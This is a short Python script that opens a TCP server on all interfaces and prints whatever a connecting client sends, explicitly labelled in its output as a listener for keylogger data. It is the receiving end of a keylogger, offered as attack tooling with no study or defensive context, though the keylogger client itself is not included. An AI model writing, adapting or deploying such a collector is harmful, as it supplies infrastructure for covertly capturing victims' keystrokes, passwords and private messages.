import socket

# === CONFIG ===
HOST = '0.0.0.0'      # Accept connections on all interfaces
PORT = 9999

server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_socket.bind((HOST, PORT))
server_socket.listen(1)

print(f"[+] Listening for keylogger data on {HOST}:{PORT}...")

conn, addr = server_socket.accept()
print(f"[+] Connection established with {addr}")

try:
    while True:
        data = conn.recv(1024)
        if not data:
            break
        print(data.decode('utf-8'), end='', flush=True)
except KeyboardInterrupt:
    print("\n[!] Server stopped.")
finally:
    conn.close()
    server_socket.close()
